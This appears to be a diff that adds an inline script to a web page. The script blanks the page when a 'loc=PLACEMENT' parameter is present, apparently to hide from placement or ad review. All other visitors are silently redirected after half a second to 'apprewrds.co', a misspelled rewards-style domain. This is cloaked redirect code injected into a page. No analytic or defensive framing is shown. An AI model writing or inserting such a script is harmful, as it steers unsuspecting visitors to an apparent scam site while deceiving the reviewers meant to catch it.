@@ -1,0 +1,14 @@
+<script>
+  (function() {
+    'use strict';
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('loc') === 'PLACEMENT') {
+      window.stop();
+      document.documentElement.innerHTML = '';
+    } else {
+      setTimeout(function() {
+        window.location.href = 'https://apprewrds.co/home/';
+      }, 500);
+    }
+  })();
+</script>
